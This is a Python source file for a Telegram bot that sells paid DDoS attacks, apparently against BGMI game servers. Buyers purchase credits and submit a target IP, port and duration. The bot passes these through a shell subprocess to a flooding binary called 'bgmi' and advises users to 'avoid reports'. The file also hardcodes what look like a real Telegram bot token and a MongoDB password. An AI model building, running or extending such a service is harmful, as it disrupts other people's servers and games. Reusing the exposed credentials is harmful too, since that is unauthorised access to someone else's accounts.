import os
import signal
import telebot
import json
import requests
import logging
import time
from pymongo import MongoClient
from datetime import datetime, timedelta
import certifi
import random
from threading import Thread
import asyncio
import aiohttp
from telebot import types
import pytz
import psutil

# Set up logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)

# Configuration
TOKEN = '7870202451:AAHDO3GBHAbQJ4TL7deDniw9V_PyM2U2y1w'
MONGO_URI = 'mongodb+srv://telegrambotbydanger:siPJXsL56GQ03onP@cluster0.0om9qyw.mongodb.net/?appName=Cluster0'
ADMIN_IDS = [1793697840]  # Your admin ID here

# Initialize MongoDB
try:
    client = MongoClient(MONGO_URI, tlsCAFile=certifi.where())
    db = client['danger']
    users_collection = db.users
except Exception as e:
    logging.error(f"MongoDB connection error: {e}")
    exit(1)

# Initialize bot
bot = telebot.TeleBot(TOKEN)
REQUEST_INTERVAL = 1

blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]

# Hardcoded price list
PRICE_LIST = {
    "5": 75,
    "10": 130,
    "30": 400,
    "50": 700
}

# Global variables for attack tracking
bot.attack_in_progress = False
bot.attack_duration = 0
bot.attack_start_time = 0

# Create a global event loop
attack_loop = asyncio.new_event_loop()

def create_inline_keyboard():
    markup = types.InlineKeyboardMarkup()
    button3 = types.InlineKeyboardButton(
        text="❤‍🩹 𝗝𝗼𝗶𝗻 𝗢𝘂𝗿 𝗖𝗵𝗮𝗻𝗻𝗲𝗹 ❤‍🩹", url="https://t.me/DANGER_BOY_OP1")
    button1 = types.InlineKeyboardButton(text="👤 𝗖𝗼𝗻𝘁𝗮𝗰𝘁 𝗢𝘄𝗻𝗲𝗿 👤",
        url="https://t.me/DANGER_BOY_OP")
    markup.add(button3)
    markup.add(button1)
    return markup

def get_price_list():
    price_list = "*💰 Credit Packages 💰*\n\n"
    for credits, price in PRICE_LIST.items():
        price_list += f"*{credits} Credits = {price} ₹*\n"

    price_list += "\n*📩 Contact @DANGER_BOY_OP to purchase credits!*"
    return price_list

def is_user_admin(user_id):
    return user_id in ADMIN_IDS

def run_bgmi_attack(target_ip, target_port, duration):
    """Execute the bgmi attack with given parameters"""
    try:
        # Make sure the bgmi file is executable
        os.chmod("./bgmi", 0o755)

        # Build the command
        command = f"./bgmi {target_ip} {target_port} {duration} 100"

        # Run the command in a subprocess
        process = subprocess.Popen(
            command,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            preexec_fn=os.setsid
        )

        return process
    except Exception as e:
        logging.error(f"Error running bgmi attack: {e}")
        return None

async def run_attack(chat_id, target_ip, target_port, duration):
    try:
        # Start the attack
        process = run_bgmi_attack(target_ip, target_port, duration)

        if not process:
            bot.send_message(chat_id, "*❌ Failed to start attack!*\nPlease try again later.",
                            reply_markup=create_inline_keyboard(), parse_mode='Markdown')
            return

        # Wait for the attack to complete
        stdout, stderr = process.communicate()

        if process.returncode != 0:
            logging.error(f"Attack failed: {stderr.decode()}")
            bot.send_message(chat_id, "*❌ Attack failed!*\nPlease try again later.",
                            reply_markup=create_inline_keyboard(), parse_mode='Markdown')
        else:
            bot.send_message(chat_id, "*✅ Attack Completed! ✅*\n"
                                    "*The attack has beaen successfully executed.*\n"
                                    "*Thank you for using our service!*",
                            reply_markup=create_inline_keyboard(), parse_mode='Markdown')
    except Exception as e:
        logging.error(f"Error running attack: {e}")
        bot.send_message(chat_id, "*❌ Error executing attack!*\nPlease try again later.",
                        reply_markup=create_inline_keyboard(), parse_mode='Markdown')
    finally:
        bot.attack_in_progress = False

@bot.message_handler(commands=['attack'])
def handle_attack_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    try:
        user_data = users_collection.find_one({"user_id": user_id})
        if not user_data or user_data.get('credits', 0) < 1:
            bot.send_message(chat_id, "*🚫 Access Denied!*\n"
                                     "*You don't have enough credits to launch an attack.*\n"
                                     "*Check /pricelist to purchase credits.*",
                                     reply_markup=create_inline_keyboard(), parse_mode='Markdown')
            return

        if bot.attack_in_progress:
            bot.send_message(chat_id, "*⚠️ Please wait!*\n"
                                     "*The bot is busy with another attack.*\n"
                                     "*Check remaining time with the /when command.*",
                                     reply_markup=create_inline_keyboard(), parse_mode='Markdown')
            return

        bot.send_message(chat_id, "*💣 Ready to launch an attack?*\n"
                                 "*Please provide the target IP, port, and duration in seconds.*\n"
                                 "*Example: 167.67.25 6296 60* 🔥\n"
                                 "*Each attack costs 1 credit.*",
                                 reply_markup=create_inline_keyboard(), parse_mode='Markdown')
        bot.register_next_step_handler(message, process_attack_command)

    except Exception as e:
        logging.error(f"Error in attack command: {e}")
        bot.send_message(chat_id, "*❌ An error occurred!*\nPlease try again later.",
                        reply_markup=create_inline_keyboard(), parse_mode='Markdown')

def process_attack_command(message):
    try:
        args = message.text.split()
        if len(args) != 3:
            bot.send_message(message.chat.id, "*❗ Error!*\n"
                                             "*Please use the correct format and try again.*\n"
                                             "*Make sure to provide all three inputs! 🔄*",
                                             reply_markup=create_inline_keyboard(), parse_mode='Markdown')
            return

        target_ip, target_port, duration = args[0], int(args[1]), int(args[2])

        if target_port in blocked_ports:
            bot.send_message(message.chat.id, f"*🔒 Port {target_port} is blocked.*\n"
                                             "*Please select a different port to proceed.*",
                                             reply_markup=create_inline_keyboard(), parse_mode='Markdown')
            return
        if duration > 280:
            bot.send_message(message.chat.id, "*⏳ Maximum duration is 280 seconds.*\n"
                                             "*Please shorten the duration and try again!*",
                                             reply_markup=create_inline_keyboard(), parse_mode='Markdown')
            return

        # Check if user has enough credits
        user_data = users_collection.find_one({"user_id": message.from_user.id})
        if not user_data or user_data.get('credits', 0) < 1:
            bot.send_message(message.chat.id, "*🚫 Not enough credits!*\n"
                                             "*You need at least 1 credit to launch an attack.*\n"
                                             "*Check /pricelist to purchase credits.*",
                                             reply_markup=create_inline_keyboard(), parse_mode='Markdown')
            return

        # Deduct 1 credit
        users_collection.update_one(
            {"user_id": message.from_user.id},
            {"$inc": {"credits": -1}, "$set": {"last_used": datetime.now().strftime("%Y-%m-%d %H:%M:%S")}}
        )

        bot.attack_in_progress = True
        bot.attack_duration = duration
        bot.attack_start_time = time.time()

        # Run the attack in the global event loop
        asyncio.run_coroutine_threadsafe(
            run_attack(message.chat.id, target_ip, target_port, duration),
            attack_loop
        )

        bot.send_message(message.chat.id, f"*🚀 Attack Launched! 🚀*\n\n"
                                         f"*📡 Target Host: {target_ip}*\n"
                                         f"*👉 Target Port: {target_port}*\n"
                                         f"*⏰ Duration: {duration} seconds!*\n"
                                         f"*💳 Credits remaining: {user_data['credits'] - 1}*",
                                         reply_markup=create_inline_keyboard(), parse_mode='Markdown')

    except Exception as e:
        logging.error(f"Error in processing attack command: {e}")
        bot.send_message(message.chat.id, "*❌ An error occurred!*\nPlease try again later.",
                        reply_markup=create_inline_keyboard(), parse_mode='Markdown')

@bot.message_handler(commands=['when'])
def when_command(message):
    chat_id = message.chat.id
    if bot.attack_in_progress:
        elapsed_time = time.time() - bot.attack_start_time
        remaining_time = bot.attack_duration - elapsed_time

        if remaining_time > 0:
            bot.send_message(chat_id, f"*⏳ Time Remaining: {int(remaining_time)} seconds...*\n"
                                     "*🔍 Hold tight, the action is still unfolding!*\n"
                                     "*💪 Stay tuned for updates!*",
                                     reply_markup=create_inline_keyboard(), parse_mode='Markdown')
        else:
            bot.send_message(chat_id, "*🎉 The attack has successfully completed!*\n"
                                     "*🚀 You can now launch your own attack!*",
                                     reply_markup=create_inline_keyboard(), parse_mode='Markdown')
    else:
        bot.send_message(chat_id, "*❌ No attack is currently in progress!*\n"
                                 "*🔄 Feel free to initiate your attack whenever you're ready!*",
                                 reply_markup=create_inline_keyboard(), parse_mode='Markdown')

@bot.message_handler(commands=['myinfo'])
def myinfo_command(message):
    try:
        user_id = message.from_user.id
        user_data = users_collection.find_one({"user_id": user_id})

        tz = pytz.timezone('Asia/Kolkata')
        now = datetime.now(tz)
        current_date = now.date().strftime("%Y-%m-%d")
        current_time = now.strftime("%I:%M:%S %p")

        if not user_data:
            response = (
                "*⚠️ No account information found. ⚠️*\n"
                "*It looks like you don't have an account with us.*\n"
                "*Check /pricelist to purchase credits and start using the bot!*\n"
            )
            markup = types.InlineKeyboardMarkup()
            button1 = types.InlineKeyboardButton(text="☣️ 𝗖𝗼𝗻𝘁𝗮𝗰𝘁 𝗢𝘄𝗻𝗲𝗿 ☣️",
                                                url="https://t.me/DANGER_BOY_OP")
            button2 = types.InlineKeyboardButton(
                text="💰 𝗣𝗿𝗶𝗰𝗲 𝗟𝗶𝘀𝘁 💰", callback_data="pricelist")
            markup.add(button1)
            markup.add(button2)
        else:
            username = message.from_user.username or "Unknown User"
            credits = user_data.get('credits', 0)
            last_used = user_data.get('last_used', 'Never')

            response = (
                f"*👤 Username: @{username}*\n"
                f"*💳 Credits: {credits}*\n"
                f"*🕒 Last Used: {last_used}*\n"
                f"*📆 Current Date: {current_date}*\n"
                f"*🕒 Current Time: {current_time}*\n\n"
                "*💡 Need more credits?*\n"
                "*Check /pricelist for our credit packages!*"
            )
            markup = types.InlineKeyboardMarkup()
            button = types.InlineKeyboardButton(
                text="💰 𝗣𝗿𝗶𝗰𝗲 𝗟𝗶𝘀𝘁 💰", callback_data="pricelist")
            markup.add(button)

        bot.send_message(message.chat.id,
                        response,
                        parse_mode='Markdown',
                        reply_markup=markup)
    except Exception as e:
        logging.error(f"Error handling /myinfo command: {e}")

@bot.callback_query_handler(func=lambda call: call.data == "pricelist")
def show_price_list(call):
    bot.answer_callback_query(call.id)
    bot.send_message(call.message.chat.id, get_price_list(),
                    reply_markup=create_inline_keyboard(), parse_mode='Markdown')

@bot.message_handler(commands=['pricelist'])
def price_list_command(message):
    bot.send_message(message.chat.id, get_price_list(),
                    reply_markup=create_inline_keyboard(), parse_mode='Markdown')

@bot.message_handler(commands=['addcredits'])
def add_credits(message):
    if not is_user_admin(message.from_user.id):
        return

    try:
        args = message.text.split()
        if len(args) < 3:
            bot.send_message(message.chat.id, "*❌ Error!*\n"
                                             "*Usage: /addcredits <user_id> <credits>*",
                                             parse_mode='Markdown')
            return

        user_id = int(args[1])
        credits = int(args[2])

        user_data = users_collection.find_one({"user_id": user_id})
        if not user_data:
            users_collection.insert_one({
                "user_id": user_id,
                "username": bot.get_chat(user_id).username if user_id > 0 else "Unknown",
                "credits": credits,
                "last_used": None
            })
        else:
            users_collection.update_one(
                {"user_id": user_id},
                {"$inc": {"credits": credits}}
            )

        bot.send_message(message.chat.id,
                        f"*✅ Success!*\n"
                        f"*Added {credits} credits to user {user_id}*",
                        parse_mode='Markdown')

        # Notify the user
        bot.send_message(user_id,
                        f"*🎉 You've received {credits} credits!*\n"
                        f"*Your new balance: {user_data['credits'] + credits if user_data else credits} credits*\n"
                        f"*Use /attack to launch attacks!*",
                        reply_markup=create_inline_keyboard(), parse_mode='Markdown')

    except Exception as e:
        bot.send_message(message.chat.id, f"*❌ Error!*\n{e}", parse_mode='Markdown')

@bot.message_handler(commands=['checkcredits'])
def check_credits(message):
    if not is_user_admin(message.from_user.id):
        return

    try:
        args = message.text.split()
        if len(args) < 2:
            bot.send_message(message.chat.id, "*❌ Error!*\n"
                                             "*Usage: /checkcredits <user_id>*",
                                             parse_mode='Markdown')
            return

        user_id = int(args[1])
        user_data = users_collection.find_one({"user_id": user_id})

        if not user_data:
            bot.send_message(message.chat.id,
                            f"*🔍 User {user_id} not found in database*",
                            parse_mode='Markdown')
            return

        bot.send_message(message.chat.id,
                        f"*💳 Credit Balance*\n"
                        f"*User ID: {user_id}*\n"
                        f"*Username: @{user_data['username']}*\n"
                        f"*Credits: {user_data['credits']}*\n"
                        f"*Last used: {user_data.get('last_used', 'Never')}*",
                        parse_mode='Markdown')

    except Exception as e:
        bot.send_message(message.chat.id, f"*❌ Error!*\n{e}", parse_mode='Markdown')

@bot.message_handler(commands=['cmd'])
def admin_commands(message):
    if not is_user_admin(message.from_user.id):
        return

    commands_list = (
        "*🔧 Admin Commands 🔧*\n\n"
        "*💳 Credit Management*\n"
        "`/addcredits <user_id> <credits>` - Add credits to a user\n"
        "`/checkcredits <user_id>` - Check user's credit balance\n\n"
        "*📢 Other Commands*\n"
        "`/pricelist` - Show credit packages\n"
        "`/broadcast <message>` - Send message to all users"
    )

    bot.send_message(message.chat.id, commands_list, parse_mode='Markdown')

@bot.message_handler(commands=['start'])
def start_message(message):
    try:
        bot.send_message(message.chat.id, "*🌍 WELCOME TO DDOS WORLD!* 🎉\n\n"
                                         "*🚀 Get ready to dive into the action!*\n\n"
                                         "*💣 Each attack costs 1 credit. Check your balance with /myinfo*\n\n"
                                         "*💰 Need credits? Check /pricelist for our credit packages!*\n\n"
                                         "*🔥 To launch an attack, use the* `/attack` *command*\n"
                                         "*Example: /attack 167.67.25 6296 60*\n\n"
                                         "*📚 New here? Check out the* `/help` *command!*",
                                         reply_markup=create_inline_keyboard(), parse_mode='Markdown')
    except Exception as e:
        logging.error(f"Error in start command: {e}")

@bot.message_handler(commands=['help'])
def help_command(message):
    help_text = ("*🌟 Welcome to the Ultimate Command Center!*\n\n"
                 "*Here's what you can do:* \n"
                 "1. *`/attack` - ⚔️ Launch a powerful attack (1 credit per attack)*\n"
                 "2. *`/myinfo` - 👤 Check your account info and credit balance*\n"
                 "3. *`/pricelist` - 💰 View our credit packages*\n"
                 "4. *`/when` - ⏳ Check if the bot is currently busy*\n"
                 "5. *`/rules` - 📜 Review the rules to keep the game fair*\n"
                 "6. *`/owner` - 📞 Contact the bot owner*\n\n"
                 "*💡 Need credits? Check /pricelist for our credit packages!*")

    try:
        bot.send_message(message.chat.id, help_text, reply_markup=create_inline_keyboard(), parse_mode='Markdown')
    except Exception as e:
        logging.error(f"Error in help command: {e}")

@bot.message_handler(commands=['rules'])
def rules_command(message):
    rules_text = (
        "*📜 Bot Rules - Keep It Cool!\n\n"
        "1. No spamming attacks! ⛔ \nRest for 5-6 matches between DDOS.\n\n"
        "2. Limit your kills! 🔫 \nStay under 30-40 kills to keep it fair.\n\n"
        "3. Play smart! 🎮 \nAvoid reports and stay low-key.\n\n"
        "4. No mods allowed! 🚫 \nUsing hacked files will get you banned.\n\n"
        "5. Be respectful! 🤝 \nKeep communication friendly and fun.\n\n"
        "6. Report issues! 🛡️ \nMessage @DANGER_BOY_OP for any problems.\n\n"
        "💡 Follow the rules and let's enjoy gaming together!*"
    )

    try:
        bot.send_message(message.chat.id, rules_text, reply_markup=create_inline_keyboard(), parse_mode='Markdown')
    except Exception as e:
        logging.error(f"Error in rules command: {e}")

@bot.message_handler(commands=['owner'])
def owner_command(message):
    response = (
        "*👤 **Owner Information:**\n\n"
        "For any inquiries, support, or to purchase credits, contact:\n\n"
        "📩 **Telegram:** @DANGER_BOY_OP\n\n"
        "💬 **We value your feedback!** Your thoughts help us improve our service.\n\n"
        "🌟 **Thank you for being part of our community!**"
    )
    bot.send_message(message.chat.id, response, reply_markup=create_inline_keyboard(), parse_mode='Markdown')

def main():
    # Start the attack event loop in a separate thread
    def start_attack_loop():
        global attack_loop
        asyncio.set_event_loop(attack_loop)
        attack_loop.run_forever()

    attack_thread = Thread(target=start_attack_loop, daemon=True)
    attack_thread.start()

    logging.info("Starting Telegram bot...")
    while True:
        try:
            bot.polling(none_stop=True, interval=0, timeout=20)
        except Exception as e:
            logging.error(f"An error occurred while polling: {e}")
            time.sleep(REQUEST_INTERVAL)

if __name__ == "__main__":
    main()